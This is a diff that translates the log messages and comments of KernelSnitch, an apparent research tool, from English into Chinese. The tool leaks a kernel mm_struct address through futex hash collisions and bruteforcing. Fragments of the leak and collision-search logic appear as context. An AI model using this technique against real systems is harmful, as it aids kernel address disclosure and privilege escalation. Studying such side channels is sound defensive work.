@@ -199,7 +199,7 @@ static void *__mm_leak(void *arg)
     struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)arg;
     struct kernelsnitch_shared_state *ks = mm_leak_arg->ks;
     struct range *range = &mm_leak_arg->range;
-    if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
+    if (ks->verbose) pr_info("[% 3zd] 开始查找mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
     size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
     for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
         if ((coarse_addr % (1ULL << 40)) == 0)
@@ -227,7 +227,7 @@ static void *__mm_leak(void *arg)
                             found_hash = (futex_hash(ks->futex_addrs[0], __mm_struct_candidate) == futex_hash(ks->futex_addrs[i], __mm_struct_candidate));
                         if (found_hash) {
                             if (ks->verbose)
-                                pr_info("found mm_struct %016zx\n", __mm_struct_candidate);
+                                pr_info("找到mm_struct %016zx\n", __mm_struct_candidate);
                             ks->mm_struct = __mm_struct_candidate;
                             ks->found = 1;
                             break;
@@ -279,13 +279,13 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
 
     ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
 
-    if (ks->verbose) pr_info("parameters cpu (%zd) mm_struct sz (%zx) mm slab order (%zd) thread cnt (%zd) collisions (%zd) mte %s\n",
+    if (ks->verbose) pr_info("参数 CPU数(%zd) mm_struct大小(%zx) mm slab阶数(%zd) 线程数(%zd) 冲突数(%zd) MTE %s\n",
         ks->cpu_cnt,
         ks->mm_struct_sz,
         ks->mm_slab_order,
         ks->thread_cnt,
         ks->collisions,
-        ks->mte_enabled ? "enabled" : "disabled");
+        ks->mte_enabled ? "启用" : "禁用");
     pin_to_core(0);
     futex_init();
 
@@ -316,11 +316,11 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     // piled-up hash bucket ID 128
     // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
     __increase(ks, ID, APPENDED_FUTEXES);
-    if (ks->verbose) pr_info("start finding collisisons\n");
+    if (ks->verbose) pr_info("开始查找冲突\n");
 
     // find futex user space address which collide with the piled-up hash bucket ID 128
     ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
-    if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
+    if (ks->verbose) pr_info("目标地址 %016zx\n", ks->futex_addrs[0]);
     for (size_t i = 2; i < ks->total_futexes && count < wanted; ++i) {
         id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
         if (id >= FUTEX_SZ)
@@ -334,10 +334,10 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         }
     }
     if (wanted == count) {
-        if (ks->verbose) pr_info("found %zd collisisons\n", count);
+        if (ks->verbose) pr_info("找到 %zd 个冲突\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_FOUND;
     } else {
-        pr_warning("only found %zd collisions -> cannot continue\n", count);
+        pr_warning("仅找到 %zd 个冲突 -> 无法继续\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
     }
 }
@@ -354,7 +354,7 @@ size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks)
 void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
 {
     ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
-    if (ks->verbose) pr_info("start bruteforcing\n");
+    if (ks->verbose) pr_info("开始暴力破解\n");
     reset_cpu_pin();
 
     for (size_t i = 0; i < ks->thread_cnt; ++i) {
@@ -391,7 +391,7 @@ size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
     munmap((void *)ks->futexes, FUTEX_SZ);
     ks->futexes = 0;
     size_t ret = ks->mm_struct;
-    if (ks->verbose) pr_info("done\n");
+    if (ks->verbose) pr_info("完成\n");
     munmap(ks, sizeof(struct kernelsnitch_shared_state));
     return ret;
 }
@@ -418,12 +418,12 @@ size_t kernelsnitch_param(size_t __mm_struct_sz, size_t __mm_slab_order, size_t 
 }
 
 /**
- * Prints the current execution state KernelSnitch is in
- * @arg ks: shared KernelSnitch state
+ * 打印KernelSnitch当前执行状态
+ * @arg ks: 共享的KernelSnitch状态
  */
 void kernelsnitch_print_state(struct kernelsnitch_shared_state *ks)
 {
-    pr_info("ks state: %s\n", kernelsnitch_strings[ks->state]);
+    pr_info("ks状态: %s\n", kernelsnitch_strings[ks->state]);
 }
 
 /**
@@ -432,7 +432,7 @@ void kernelsnitch_print_state(struct kernelsnitch_shared_state *ks)
  */
 void kernelsnitch_print_collisions(struct kernelsnitch_shared_state *ks)
 {
-    pr_info("collisions:\n");
+    pr_info("冲突列表:\n");
     for (size_t i = 2; i < ks->collisions; ++i) {
         size_t addr = ks->futex_addrs[i];
         pr_info("  %016zx\n", addr);
